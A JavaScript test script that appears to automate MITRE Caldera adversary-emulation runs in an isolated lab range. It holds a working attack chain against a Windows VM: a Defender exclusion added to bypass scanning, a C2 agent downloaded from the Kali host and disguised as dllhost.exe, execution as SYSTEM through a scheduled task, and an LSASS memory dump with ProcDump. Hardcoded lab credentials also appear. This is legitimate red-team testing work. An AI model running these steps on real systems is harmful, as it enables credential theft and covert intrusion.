import { $ } from "bun"

const KALI_IP = "10.1.99.1"
const WIN11_IP = "10.1.99.24"
const KALI_SSH = "kali:kali"
const WINRM_AUTH = "localuser:password"
const CALDERA_URL = "http://10.1.99.1:8888"
const CALDERA_KEY = "ADMIN123"

// ─── Existing Building Blocks ───────────────────────────────────────────────

// 1. SSH command execution — works, tested
//    Uses .nothrow().quiet() to prevent Bun from throwing on non-zero exit.
//    Stderr is captured and included in the error message for debugging.
//    Pattern from server/ludus/range.js:873 (checkCaldera)
// FIXED: Was .quiet() (Bun threw on non-zero exit). Now .nothrow().quiet() + manual exitCode check.
async function sshRun(host, user, pass, command) {
  const result = await $`sshpass -p ${pass} ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 ${user}@${host} ${command}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stderr = result.stderr.toString().trim()
    throw new Error(`SSH exit ${result.exitCode}: ${stderr || "no stderr"}`)
  }
  return result.stdout.toString().trim()
}

// 2. WinRM command execution — works via pywinrm (already in pyproject.toml)
//    No existing one-off runner in the codebase. winrm-proxy.js is interactive-only.
//    We use pywinrm's Session.run_cmd() via a Python subprocess.
//    Backslashes are escaped (C:\ → C:\\) to avoid Python unicodeescape errors.
// FIXED: Was .quiet(). Now .nothrow().quiet() + manual exitCode/exitcode check. Stdout captured in errors.
// FIXED: Backslash escaping (C:\ → C:\\) to avoid Python \U unicodeescape parsing errors.
async function winrmRun(host, user, pass, command) {
  const py = `
import winrm
s = winrm.Session('${host}', auth=('${user}', '${pass}'), transport='ssl', server_cert_validation='ignore')
r = s.run_cmd('${command.replace(/\\/g, "\\\\").replace(/'/g, "\\'")}')
print(r.std_out.decode())
if r.std_err.decode().strip():
    print(r.std_err.decode(), end='')
exit(r.status_code)
`
  const result = await $`uv run python -c ${py}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stdout = result.stdout.toString().trim()
    const stderr = result.stderr.toString().trim()
    throw new Error(`WinRM exit ${result.exitCode}: ${stdout || stderr || "no output"}`)
  }
  return result.stdout.toString().trim()
}

async function calderaApi(method, path, body) {
  const opts = {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    signal: AbortSignal.timeout(10000),
  }
  if (body !== undefined) opts.body = JSON.stringify(body)
  const res = await fetch(`${CALDERA_URL}${path}`, opts)
  return res.json()
}

async function calderaRest(method, body) {
  const res = await fetch(`${CALDERA_URL}/api/rest`, {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(10000),
  })
  return res.json()
}

// ─── Connectivity Tests ─────────────────────────────────────────────────────

async function testSshConnectivity() {
  console.log("\n=== SSH Connectivity (kali) ===")
  try {
    const user = await sshRun(KALI_IP, "kali", "kali", "whoami")
    console.log(`  PASS: whoami = ${user}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmConnectivity() {
  console.log("\n=== WinRM Connectivity (win11-22h2) ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "whoami")
    console.log(`  PASS: whoami = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testCalderaConnectivity() {
  console.log("\n=== Caldera API ===")
  try {
    const agents = await calderaRest("POST", { index: "agents" })
    console.log(`  PASS: agents endpoint reachable, ${agents.length} agents found`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

// ─── Prereq Command Execution Tests ──────────────────────────────────────────

// Prereqs are now generated with smart existence checks in generateFocusedData.js.
// Each kali_prereq is wrapped in `if [ -f "$PAYLOAD_PATH" ]; then echo "ALREADY_PRESENT"; else ... fi`
// ($HOME is used instead of ~ because ~ does not expand inside double quotes in bash)
// Each win_prereq is wrapped in `if (Test-Path "PAYLOAD_PATH") { ... } else { ... }`
// systemctl commands use sudo systemctl (kali has NOPASSWD sudoers for caldera.service)

async function testSshPrereq() {
  console.log("\n=== SSH Prereq Execution ===")
  try {
    const output = await sshRun(KALI_IP, "kali", "kali", "id")
    console.log(`  PASS: "id" = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmPrereq() {
  console.log("\n=== WinRM Prereq Execution ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "ver")
    console.log(`  PASS: "ver" = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

// ─── Sandcat Agent Deployment Test ──────────────────────────────────────────

async function testSandcatDeploy() {
  console.log("\n=== Sandcat Agent Deploy (win11) ===")
  const group = `test-${Date.now()}`
  try {
    // Kill stale dllhost processes from previous runs
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    // Kill stale caldera agents
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`  Cleaned ${agents.length} stale agents`)
    } catch {}

    // Check if localuser is admin
    const whoami = await winrmRun(WIN11_IP, "localuser", "password", 'powershell -Command "if (whoami /groups | Select-String S-1-5-32-544) { Write-Host ADMIN } else { Write-Host NOT_ADMIN }"')
    console.log(`  admin: ${whoami.trim()}`)
    const isAdmin = whoami.includes("ADMIN") && !whoami.includes("NOT_ADMIN")

    // Only add exclusion if Defender real-time protection is enabled
    if (isAdmin) {
      try {
        const status = await winrmRun(WIN11_IP, "localuser", "password",
          'powershell -Command "if ((Get-MpComputerStatus).RealTimeProtectionEnabled) { Write-Host ENABLED } else { Write-Host DISABLED }"')
        if (status.trim() === "ENABLED") {
          await winrmRun(WIN11_IP, "localuser", "password",
            'powershell -Command "Add-MpPreference -ExclusionPath \'C:\\Users\\Public\'"')
          console.log("  Defender: exclusion added for C:\\Users\\Public")
        } else {
          console.log("  Defender: real-time protection is DISABLED")
        }
      } catch {
        console.log("  Defender: exclusion failed")
      }
    }

    // ── Step 1: Network check ──
    console.log("\n  [1] Network to Caldera")
    const netTest = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "Test-NetConnection -ComputerName 10.1.99.1 -Port 8888 -InformationLevel Quiet | ForEach-Object { if ($_) { Write-Host REACHABLE } else { Write-Host UNREACHABLE } }"')
    console.log(`  => 10.1.99.1:8888 ${netTest.trim()}`)

    // ── Step 2: Download sandcat ──
    console.log("\n  [2] Download sandcat.go → C:\\Users\\Public\\dllhost.exe")
    const dl = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`  => ${dl.trim()}`)

    // ── Step 3: File check ──
    console.log("\n  [3] File check")
    const fileCheck = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "$f=Get-Item \'C:\\Users\\Public\\dllhost.exe\' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""')
    console.log(`  => ${fileCheck.trim()}`)

    // ── Step 4: Deploy sandcat via Scheduled Task (SYSTEM) ──
    console.log(`\n  [4] Deploy sandcat via Scheduled Task as SYSTEM (group=${group}), wait 20s, check alive`)
    const taskName = `CalderaSandcat-${group}`
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    } catch (err) {
      console.log(`  => task creation failed: ${err.message}`)
    }
    await new Promise(r => setTimeout(r, 20000))

    // Check if dllhost.exe is running (should be running as SYSTEM now)
    try {
      const tl = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "$p=Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' }; if ($p) { $wmi=Get-WmiObject Win32_Process -Filter \\"ProcessId=$($p.Id)\\"; $owner=$wmi.GetOwner(); Write-Host \\"RUNNING pid=$($p.Id) user=$($owner.User)\\" } else { Write-Host \\"DIED\\" }"')
      console.log(`  => process: ${tl.trim()}`)
    } catch (err) {
      console.log(`  => process check failed: ${err.message}`)
    }

    // ── Step 5: Check agents ──
    console.log("\n  [5] Caldera agents (after 20s wait):")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      console.log(`  => ${agents.length} agents:`)
      for (const a of agents) {
        console.log(`     paw=${a.paw} group=${a.group} trusted=${a.trusted}`)
      }
      const mine = agents.find(a => a.group === group)
      if (mine) {
        console.log(`  => MY agent CHECKED IN! paw=${mine.paw} trusted=${mine.trusted}`)
      } else {
        console.log(`  => MY agent (group=${group}) NOT found`)
        // Try checking agent after another 15s
        console.log("\n  [5b] Waiting another 15s, checking again...")
        await new Promise(r => setTimeout(r, 15000))
        const agents2 = await calderaRest("POST", { index: "agents" })
        const mine2 = agents2.find(a => a.group === group)
        if (mine2) {
          console.log(`  => MY agent CHECKED IN on retry! paw=${mine2.paw} trusted=${mine2.trusted}`)
        } else {
          console.log(`  => MY agent (group=${group}) STILL not found`)
          console.log(`  => agents now: ${agents2.map(a => `${a.paw}(${a.group})`).join(', ')}`)
        }
      }
    } catch (err) {
      console.log(`  => agents check failed: ${err.message}`)
    }

    // ── Cleanup: Unregister scheduled task ──
    console.log(`\n  [cleanup] Unregistering scheduled task ${taskName}`)
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:\$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("  => task cleaned up")
    } catch (err) {
      console.log(`  => task cleanup failed: ${err.message}`)
    }

    return true
  } catch (err) {
    console.log(`\n  UNEXPECTED FAIL: ${err.message}`)
    return false
  }
}

// ─── Pipeline Functions (IMPLEMENTED in testAbility.js) ─────────────────────

// All functions implemented in: server/caldera/testAbility.js
//
// getCalderaAgents()          — POST /api/rest { index: "agents" }
// deploySandcatWindows(ip)    — WinRM: download sandcat, run with group
// waitForAgent(group)         — poll agents by group every 3s until found
// createAdversary(name, abilityId) — PUT /api/rest { index: "adversaries", ... }
// createOperation(name, advId, group) — PUT /api/rest { index: "operations", ... }
// pollOperation(opId)         — POST /api/rest { index: "operations", id: opId } until finished
// getOperationReport(opId)    — POST /api/rest { index: "operations", id: opId }, extracts facts from chain
// deleteOperation(opId)       — DELETE /api/rest { index: "operations", id: opId }
// deleteAdversary(advId)      — DELETE /api/rest { index: "adversaries", adversary_id: advId }
//
// Additional functions:
// normalizePrereq(script)     — collapses multiline shell scripts to single line
// normalizeWinPrereq(script)  — collapses multiline PS to semicolon-separated
// installKaliPrereq(ip, s)    — runs Kali prereq via SSH
// installWinPrereq(ip, s)     — runs Windows prereq via WinRM
// sendStatus(ws, step, status, msg) — sends WS status update + console.logs it

async function testMissingFunctions() {
  console.log("\n=== Missing Functions (all implemented in testAbility.js) ===")
  const needed = [
    "getCalderaAgents()",
    "deploySandcatWindows(ip)",
    "waitForAgent(targetHost)",
    "createAdversary(abilityId)",
    "createOperation(name, adversaryId, group)",
    "pollOperation(opId)",
    "getOperationReport(opId)",
    "deleteOperation(opId)",
    "deleteAdversary(advId)",
  ]
  for (const fn of needed) {
    console.log(`  [x] ${fn}`)
  }
  return needed
}

// ─── Full Pipeline Integration Test ──────────────────────────────────────────

async function testFullPipeline() {
  console.log("\n=== Full Pipeline: Dump LSASS.exe Memory using ProcDump ===")

  const abilityId = "3ae905fe6171f9d0fbefd9cb6b8d6a82"
  const abilityName = "Dump LSASS.exe Memory using ProcDump"
  const group = `test-${Date.now()}`
  const taskName = `CalderaSandcat-${group}`

  const kaliPrereq = `if [ -f "$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe" ]; then echo "ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && wget -q "https://download.sysinternals.com/files/Procdump.zip" -O /tmp/Procdump.zip && unzip -o /tmp/Procdump.zip -d /tmp/Procdump && cp /tmp/Procdump/procdump64.exe $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && rm -rf /tmp/Procdump.zip /tmp/Procdump && sudo systemctl restart caldera; fi`

  let agentPaw = null

  try {
    // ── Step 1: Clean slate ──
    console.log("\n  [1/6] Cleaning previous agents, processes, and tasks...")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`    Cleaned ${agents.length} stale agents`)
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-ScheduledTask -TaskName \'CalderaSandcat-*\' -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false; Write-Host \'TASKS_CLEANED\'"')
    } catch {}
    console.log("    => clean")

    // ── Step 2: Install prereqs on Kali ──
    console.log("\n  [2/6] Running kali prereq (Procdump download + Caldera restart)...")
    const prereqResult = await sshRun(KALI_IP, "kali", "kali", kaliPrereq)
    console.log(`    => ${prereqResult.slice(0, 200)}`)
    if (prereqResult.includes("Procdump.zip") && !prereqResult.includes("ALREADY_PRESENT")) {
      console.log("    => Caldera was restarted, waiting to come back (120s timeout)...")
      const start = Date.now()
      while (Date.now() - start < 120000) {
        try {
          await calderaRest("POST", { index: "agents" })
          console.log(`    => Caldera ready after ${Math.round((Date.now() - start) / 1000)}s`)
          break
        } catch {}
        await new Promise(r => setTimeout(r, 1000))
      }
    }

    // ── Step 3: Deploy sandcat via Scheduled Task as SYSTEM ──
    console.log(`\n  [3/6] Deploying sandcat as SYSTEM (group=${group})...`)
    try {
      const status = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "if ((Get-MpComputerStatus).RealTimeProtectionEnabled) { Write-Host ENABLED } else { Write-Host DISABLED }"')
      if (status.trim() === "ENABLED") {
        await winrmRun(WIN11_IP, "localuser", "password",
          'powershell -Command "Add-MpPreference -ExclusionPath \'C:\\Users\\Public\'"')
        console.log("    Defender: exclusion added")
      }
    } catch {}
    const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`    => download: ${dlResult.trim()}`)
    await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    console.log("    => sandcat deployed via Scheduled Task")

    // ── Step 4: Wait for agent + fetch ability + deploy payload ──
    console.log(`\n  [4/6] Waiting for agent (group=${group})...`)
    const agentStart = Date.now()
    while (Date.now() - agentStart < 60000) {
      const agents = await calderaRest("POST", { index: "agents" })
      const agent = agents.find(a => a.group === group)
      if (agent) {
        agentPaw = agent.paw
        console.log(`    => Agent checked in: paw=${agent.paw} trusted=${agent.trusted} platform=${agent.platform} executors=${JSON.stringify(agent.executors)} (${Math.round((Date.now() - agentStart) / 1000)}s)`)
        break
      }
      await new Promise(r => setTimeout(r, 3000))
    }
    if (!agentPaw) throw new Error("Agent did not check in within 60s")

    console.log(`\n  [4b/6] Fetching ability "${abilityName}"...`)
    const abilities = await calderaRest("POST", { index: "abilities", ability_id: abilityId })
    const ability = Array.isArray(abilities) ? abilities.find(a => a.ability_id === abilityId) : abilities
    if (!ability) throw new Error(`Ability "${abilityId}" not found in Caldera`)
    console.log(`    => platform=${ability.platform} executors=${JSON.stringify(ability.executors)}`)

    console.log(`\n  [4c/6] Deploying payload to Windows...`)
    const cmdMatch = ability.executors[0].command.match(/ExternalPayloads\\([^\s"]+)/)
    if (cmdMatch) {
      const filename = cmdMatch[1]
      const destPath = `C:\\Users\\Public\\${filename}`
      console.log(`    => Payload: ${filename}`)
      const check = await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "if (Test-Path '${destPath}') { Write-Host 'EXISTS' } else { Write-Host 'MISSING' }"`)
      if (check.includes("MISSING")) {
        console.log(`    => Downloading from sysinternals...`)
        await winrmRun(WIN11_IP, "localuser", "password",
          `powershell -Command "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/Procdump.zip' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\${filename}' '${destPath}' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force; Write-Host 'DEPLOYED'"`)
      }
      await winrmRun(WIN11_IP, "localuser", "password",
        `reg add "HKU\\S-1-5-18\\Software\\Sysinternals\\ProcDump" /v EulaAccepted /t REG_DWORD /d 1 /f`)
      console.log(`    => EULA pre-accepted for SYSTEM`)
      console.log(`    => Payload ready at ${destPath}`)
    }

    // ── Step 5: Modify ability command + exploit ──
    console.log(`\n  [5/6] Exploiting agent with ability...`)

    const original = await calderaApi("GET", `/api/v2/abilities/${abilityId}`)
    const modified = structuredClone(original)
    const oldCmd = modified.executors[0].command
    modified.executors[0].command = oldCmd.replace(
      /"PathToAtomicsFolder[^"]*"/,
      `"C:\\Users\\Public\\procdump.exe"`
    )
    console.log(`    => Command: "${oldCmd.slice(0, 60)}..." → "${modified.executors[0].command.slice(0, 60)}..."`)

    await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, modified)
    console.log(`    => Ability command updated`)

    const exploitResult = await calderaApi("POST", "/plugin/access/exploit", { paw: agentPaw, ability_id: abilityId, obfuscator: "plain-text" })
    console.log(`    => /plugin/access/exploit result: ${JSON.stringify(exploitResult).slice(0, 200)}`)

    // Wait for link to appear
    console.log(`    => Waiting for link (120s timeout)...`)
    let linkFacts = []
    let linkStatus = null
    const pollStart = Date.now()
    while (Date.now() - pollStart < 120000) {
      const agents = await calderaRest("POST", { index: "agents", paw: agentPaw })
      const ag = Array.isArray(agents) ? agents[0] : agents
      const links = ag?.links || []
      const mine = links.find(l => l.ability?.ability_id === abilityId)
      if (mine) {
        console.log(`    Link found: id=${mine.id} status=${mine.status}`)
        console.log(`    Command: ${mine.command}`)
        console.log(`    Output (stdout): ${mine.output?.stdout || "(none)"}`)
        console.log(`    Output (stderr): ${mine.output?.stderr || "(none)"}`)
        console.log(`    Facts: ${JSON.stringify(mine.facts)}`)
        linkStatus = mine.status
        linkFacts = mine.facts || []
        break
      }
      await new Promise(r => setTimeout(r, 2000))
    }

    // Restore ability command
    await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, original)
    console.log(`    => Ability command restored`)

    // ── Step 6: Verify dump file ──
    console.log(`\n  [6/6] Verifying dump file...`)
    try {
      const dumpCheck = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "if (Test-Path \'C:\\Windows\\Temp\\lsass_dump.dmp\') { $f=Get-Item \'C:\\Windows\\Temp\\lsass_dump.dmp\'; Write-Host \\"EXISTS $([math]::Round($f.Length/1024/1024,1))MB\\" } else { Write-Host \\"MISSING\\" }"')
      console.log(`    => Dump file: ${dumpCheck.trim()}`)
    } catch (err) {
      console.log(`    => Dump file check failed: ${err.message}`)
    }

    for (const f of linkFacts.slice(0, 10)) {
      console.log(`    fact: trait=${f.trait} value=${String(f.value).slice(0, 120)}`)
    }

    const passed = linkFacts.length > 0
    console.log(`\n  => Pipeline test: ${passed ? "PASSED" : "FAILED"} (link status=${linkStatus}, facts=${linkFacts.length})`)
    return passed
  } catch (err) {
    console.log(`\n  PIPELINE FAILED: ${err.message}`)
    return false
  } finally {
    // ── Cleanup: always run, best-effort ──
    console.log("\n  [cleanup] Removing agent, task, process, and dump...")
    try { if (agentPaw) await calderaRest("DELETE", { index: "agents", paw: agentPaw }); console.log("    agent deleted") } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
      console.log("    dllhost process killed")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("    scheduled task unregistered")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Windows\\Temp\\lsass_dump.dmp\' -Force -ErrorAction SilentlyContinue; Write-Host \'DUMP_DELETED\'"')
      console.log("    dump file deleted")
    } catch {}
    console.log("    => cleanup complete")
  }
}

// ─── End-to-End Pipeline (in testAbility.js) ────────────────────────────────

// Full flow: powerCheck → cliCheck → prereqInstall → agentDeploy → agentWait
//            → abilityLookup → payloadDeploy → abilityExploit → cleanup → complete
//
// Each step sends real-time { type: "testAbilityStatus", step, status, message }
// to the frontend via WebSocket.
//
// Steps:
//   powerCheck       — verify VMs exist and are powered on via Ludus API
//   cliCheck         — test SSH (22) and WinRM (5986) port reachability
//   prereqInstall    — run kali_prereq (SSH) and win_prereq (WinRM) if provided
//   agentDeploy      — WinRM: download sandcat binary, launch via Scheduled Task as SYSTEM
//   agentWait        — poll Caldera agents every 3s until matching group
//   abilityLookup    — fetch full ability object for diagnostics
//   payloadDeploy    — download ability payload to C:\Users\Public\ on Windows
//   abilityExploit   — POST /plugin/access/exploit { paw, ability_id }, poll agent links
//   cleanup          — DELETE agent, unregister scheduled task, kill process

// ─── Console Logging (added to trace full pipeline) ─────────────────────────

// Every layer has console.logs with [client], [ws], or [server] prefix:
//
//   [client] Test Ability button clicked
//   [client] Sending testAbility WS message: payload
//   [client] Received status update — step=... status=... message="..."
//   [ws]     dispatching message type="..." to handler
//   [server] testAbility() entry — data: ...
//   [server] sendStatus step=... status=... "message"
//   [server] SSH run: ssh user@host — command...
//   [server] WinRM run: user@host — command...
//   [server] Caldera POST /api/rest index=...
//   [server] getCalderaAgents() — fetching agent list
//   [server] deploySandcatWindows(ip=..., group=...)
//   [server] waitForAgent(group=..., timeoutMs=...)
//   [server] agent found: paw=... group=...
//   [server] createAdversary(name=..., abilityId=...)
//   [server] adversary created id=...
//   [server] createOperation(name=..., advId=..., group=...)
//   [server] operation created id=...
//   [server] pollOperation(opId=..., timeoutMs=...)
//   [server] operation finished: state=finished
//   [server] getOperationReport(opId=...)
//   [server] deleteOperation(opId=...)
//   [server] deleteAdversary(advId=...)
//   [server] testAbility caught error: error message

// ─── Prereq Generation (in generateFocusedData.js) ──────────────────────────
//
// PAYLOAD_DOWNLOADS entries include a `dest` field specifying the final
// payload path on Kali. mergeWithPayloadSteps() wraps kali_steps:
//
//   kali_prereq = `if [ -f "$PAYLOAD_DIR/procdump.exe" ]; then echo "ALREADY_PRESENT"; else ...; fi`
// ($HOME expands correctly inside double quotes; ~ does not)
//
// FIXED: ~ changed to $HOME because ~ inside double quotes is literal (~expands only unquoted in bash).
// FIXED: strip() replaces `systemctl` → `sudo systemctl` because Caldera is a root-level service.
//        kali has NOPASSWD sudoers for caldera.service (set in kaliAnsibleStart.yml).
// FIXED: waitForCaldera() polls /api/rest every 1s for 120s after prereq restart, then proceeds.
//
// Kali prerun in kaliAnsibleStart.yml:
//   - Service at /etc/systemd/system/caldera.service (root-level, User=kali)
//   - WantedBy=multi-user.target
//   - Kali NOPASSWD sudoers entry: kali ALL=(ALL) NOPASSWD: /usr/bin/systemctl * caldera.service
//
// ─── Sandcat Deployment Path (from testAbility.js) ───────────────────────────
//
// For Windows (via WinRM → Scheduled Task):
//   1. Check (Get-MpComputerStatus).RealTimeProtectionEnabled — only add exclusion if enabled
//   2. If enabled → Add-MpPreference -ExclusionPath "C:\Users\Public"
//   3. Download sandcat binary via WebClient
//   4. Create Scheduled Task as NT AUTHORITY\SYSTEM:
//        $action = New-ScheduledTaskAction -Execute 'C:\Users\Public\dllhost.exe' -Argument '-server ... -group ...'
//        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
//        $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest
//        Register-ScheduledTask ... -Force | Out-Null
//        Start-ScheduledTask ...
//   5. Cleanup: Unregister-ScheduledTask at end of pipeline
//
// FIXED: Sandcat runs as SYSTEM via Scheduled Task (not Start-Process -WindowStyle Hidden)
//        which detaches from WinRM session and provides correct privilege level for
//        credential-dumping abilities (LSASS access, SAM hive, etc.)
// FIXED: Binary renamed dllhost.exe (blends in as Windows COM Surrogate name).
// FIXED: Defender real-time protection block bypassed with Add-MpPreference -ExclusionPath.
// FIXED: Task cleanup via Unregister-ScheduledTask at end of pipeline.

// ─── Main ────────────────────────────────────────────────────────────────────

async function main() {
  console.log("testAbility — Building Block Inventory\n")

  const results = {
    sshConnectivity: await testSshConnectivity(),
    winrmConnectivity: await testWinrmConnectivity(),
    calderaConnectivity: await testCalderaConnectivity(),
    sshPrereq: await testSshPrereq(),
    winrmPrereq: await testWinrmPrereq(),
    sandcatDeploy: await testSandcatDeploy(),
    fullPipeline: await testFullPipeline(),
  }

  const missing = await testMissingFunctions()

  console.log("\n=== Summary ===")
  let pass = 0
  let fail = 0
  for (const [key, ok] of Object.entries(results)) {
    if (ok) { pass++; console.log(`  [PASS] ${key}`) }
    else { fail++; console.log(`  [FAIL] ${key}`) }
  }
  console.log(`\n  ${pass} passed, ${fail} failed, ${missing.length} pipeline functions (all built)`)
  console.log(`\n  Existing building blocks: SSH, WinRM, Caldera REST, Scheduled Task deploy, /plugin/access/exploit`)
  console.log(`  Full pipeline test: agentWait → abilityLookup → payloadDeploy → abilityExploit → cleanup`)
  console.log(`  Pipeline implemented in: server/caldera/testAbility.js`)
  console.log(`  Prereq generation in: server/caldera/generateFocusedData.js`)
  console.log(`  Caldera systemd service (root): server/kaliAnsibleStart.yml`)
  console.log(`\n  Changes this session:`)
  console.log(`    - Replaced adversary/operation/planner pipeline with /plugin/access/exploit`)
  console.log(`    - Ability command PathToAtomicsFolder → local C:\\Users\\Public\\ path (via v2 API PUT)`)
  console.log(`    - Payload deployment: download from sysinternals directly to Windows`)
  console.log(`    - Operation polling → agent link polling (2s interval, 120s timeout)`)
}

main().catch(console.error)
